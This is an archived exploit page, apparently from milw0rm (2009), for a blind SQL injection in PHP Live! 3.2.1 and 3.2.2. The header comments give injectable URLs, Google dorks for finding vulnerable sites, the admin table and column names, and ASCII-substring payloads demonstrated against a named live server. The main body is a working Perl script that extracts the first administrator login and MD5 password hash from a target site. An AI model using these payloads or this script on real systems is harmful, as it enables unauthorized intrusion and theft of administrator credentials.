<html><head><title>PHP Live! 3.2.1/2 (x) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

#################################################################
#################################################################
################ Original discover author banner ################
#################################################################
#################################################################
#  PhpLive 3.2.1/2 (x) Blind SQL injection                                       [_][-][X]
#      _  ___  _  ___      ___ ___ _____      __  ___ __   __  ___       
#     | |/ / || |/ __|___ / __| _ \ __\ \    / / |_  )  \ /  \/ _ \      
#     | ' &lt;| __ | (_ |___| (__|   / _| \ \/\/ /   / / () | () \_, /      
#     |_|\_\_||_|\___|    \___|_|_\___| \_/\_/   /___\__/ \__/ /_/       
#                                                                          
#                                                                        
#      Red n'black i dress eagle on my chest.
#      It's good to be an ALBANIAN Keep my head up high for that flag i die.
#      Im proud to be an ALBANIAN
#   ###################################################################   
#       Author             : boom3rang                              
#       Contact            : boom3rang[at]live.com                         
#       Greetz       : H!tm@N - KHG - cHs
#
#          R.I.P redc00de                 
#   -------------------------------------------------------------------   
#                                             
#                  Affected software description                         
#       Software     : PhpLive                                          
#       Vendor        : http://www.phplivesupport.com                     
#       Price               : Live Support Download Starts at $89.95         
#       Version Vuln.    : v3.2.1 &amp; v3.2.2                     
#   -------------------------------------------------------------------   
#                                             
#    [~] SQLi :                                         
#                                             
#    http://www.TARGET.com/message_box.php?theme=&amp;l=[USERNAME]&amp;x=[SQLi]          
#    http://www.TARGET.com/request.php?l=[USERNAME]&amp;x=[SQLi]                      
#     
#                                                                  
#    [~]Google Dork :                                            
#   
#    Powered by PHP Live! v3.2.1                               
#    Powered by PHP Live! v3.2.2 
#    allinurl:&quot;request.php&quot; &quot;deptid&quot;                                 
#                                             
#   -------------------------------------------------------------------   
#                                             
#    [~] Table_NAME  =  chat_admin
#    [~] Column_NAME =  login - password - email - userID - name                                                                       
#   -------------------------------------------------------------------   
#                                             
#    [~] Admin Path :                                     
#                                             
#    http://www.TARGET.com/phplive   
#   -------------------------------------------------------------------                         
#    [~] Live Demo:
#   
#    http://chat.apolloservers.com/phplive/request.php?l=admin&amp;x=1 AND 1=1    --&gt; True
#    http://chat.apolloservers.com/phplive/request.php?l=admin&amp;x=1 AND 1=2    --&gt; False
#
#   -------------------------------------------------------------------
#
#    [~] ASCII
#
#  /**/and/**/ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/chat_admin/**/limit/**/1,1),1,1))&gt;100
#
#   -------------------------------------------------------------------
#   
#    [~] Live Demo ASCII
#
#      True
#   http://chat.apolloservers.com/phplive/request.php?l=admin&amp;x=1/**/and/**/ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/chat_admin/**/limit/**/1,1),1,1))&gt;48       
#     
#      False
#   http://chat.apolloservers.com/phplive/request.php?l=admin&amp;x=1/**/and/**/ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/chat_admin/**/limit/**/1,1),1,1))&gt;127              
#                     

###########################
###########################
# Modified version banner #
###########################
###########################

# Author: skys
# Contact: skysbsb[at]gmail.com
# This script uses the PhpLive Blind Sql Injection (found by boom3rang) to recover first user login and MD5 password!
# The result of this script is like:
# admin:890f37d479270aea39ae0e156bbd9001


####################
# EDIT THESE LINES #
####################

# Edit this address acording to the php live path
$address = &quot;http://www.site.com/phplive&quot;;

###############################
# DO NOT EDIT BELOW THIS LINE #
###############################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

@site = ($address.&quot;/request.php?l=agenciawiv&amp;x=1/**/and/**/ascii%28substring%28%28select/**/concat%28login,0x3a,password%29/**/from/**/chat_admin/**/limit/**/1,1%29,&quot;, &quot;,1%29%29=&quot;);

$base64str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;


$tudo = &quot;&quot;;
$foundcolon = 0;


for($i=1;$i&lt;=100;$i++) {
    $found = 0;

    if($foundcolon == 0) {
        for($x=32;$x&lt;=127;$x++) {
            $url = $site[0].$i.$site[1].$x;
            print &quot;Testing pass index $i: character &quot;.chr($x).&quot;($x)\n&quot;;
            $resp = query($url);
            if($resp =~ m/deptid/i) {
                print &quot;Found i($i): &quot;.chr($x).&quot;($x)\n&quot;;
                $tudo .= chr($x);
                print &quot;All: $tudo\n&quot;;
                $found = 1;
                if($x == 0x3a) {
                    $foundcolon = 1;
                }
                last;
            }
        }
    } else {
        for($x=0;$x&lt;length($base64str);$x++) {
            $url = $site[0].$i.$site[1].ord(substr($base64str, $x, 1));
            print &quot;Testing pass index $i: character &quot;.ord(substr($base64str, $x, 1)).&quot;(&quot;.substr($base64str, $x, 1).&quot;)\n&quot;;
            $resp = query($url);
            if($resp =~ m/deptid/i) {
                print &quot;Found i($i): &quot;.substr($base64str, $x, 1).&quot;(&quot;.ord(substr($base64str, $x, 1)).&quot;)\n&quot;;
                $tudo .= substr($base64str, $x, 1);
                print &quot;All: $tudo\n&quot;;
                $found = 1;
                last;
            }
        }
    }

    if($found == 0) {
        print &quot;Not found char index $i! End of md5 hash? :-)\n&quot;;
        last;
    }
}

print &quot;login:md5: $tudo\n&quot;;
exit;

sub query() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new( GET =&gt; $link );
    my $ua = LWP::UserAgent-&gt;new();
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

# milw0rm.com [2009-07-24]</pre></html>